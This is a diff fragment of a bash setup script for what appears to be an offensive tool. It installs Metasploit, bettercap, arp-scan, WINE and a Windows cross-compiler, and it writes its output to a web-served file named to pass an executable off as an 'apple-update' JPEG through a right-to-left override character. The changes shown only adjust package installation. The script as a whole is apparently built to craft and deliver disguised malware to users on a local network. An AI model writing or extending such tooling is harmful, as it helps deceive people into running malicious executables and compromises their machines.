@@ -40,17 +40,16 @@ SFX_OUT="/var/www/html/apple-update-%E2%80%AEexe.jpg"
 # --- Install Required Tools ---
 color_print CYAN "[*] Checking and installing required tools..."
 apt update -y
-for pkg in wget curl jq rar imagemagick apache2 arp-scan python3 pip3 wine winetricks mingw-w64 metasploit-framework bettercap; do
+for pkg in wget curl jq rar imagemagick apache2 arp-scan python3 python3-pip wine winetricks mingw-w64 metasploit-framework bettercap; do
     dpkg -s "$pkg" &>/dev/null || apt install -y "$pkg"
 done
-pip3 install pyinstaller --break-system-packages
 
 # --- Set Up WINE + Install Windows Python ---
 color_print GREEN "[*] Setting up WINE and installing Windows Python..."
 export WINEPREFIX="$WINEPREFIX"
 export WINEARCH=win64
 wineboot &>/dev/null
-winetricks -q -f python39 || { color_print RED "[X] Winetricks Python installation failed."; exit 1; }
+winetricks -q -f python3 python3-pip || { color_print RED "[X] Winetricks Python installation failed."; exit 1; }
 
 # --- Detect Interface and Local IP ---
 color_print GREEN "[*] Detecting network interface and local IP..."
